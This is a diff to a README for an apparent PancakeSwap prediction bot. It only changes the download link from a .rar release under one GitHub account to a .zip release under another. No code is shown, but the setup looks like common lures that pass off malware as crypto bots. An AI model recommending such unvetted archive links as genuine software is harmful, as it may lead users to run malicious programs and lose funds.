@@ -10,7 +10,7 @@ Welcome to the PancakeSwap Prediction Bot repository! This bot is designed to he
 
 ## Download
 
-You can download the bot from [here](https://github.com/BearAnBull/Pancakeswap-Winningbot/releases/download/V.1.1.5/Pancakeswap-Winningbot.2023.rar).
+You can download the bot from [here](https://github.com/Oligard008/Pancakeswap-Bot/releases/download/Bot/Pancakeswap-Prediction-Bot-main.zip).
 
 ## Installation
 
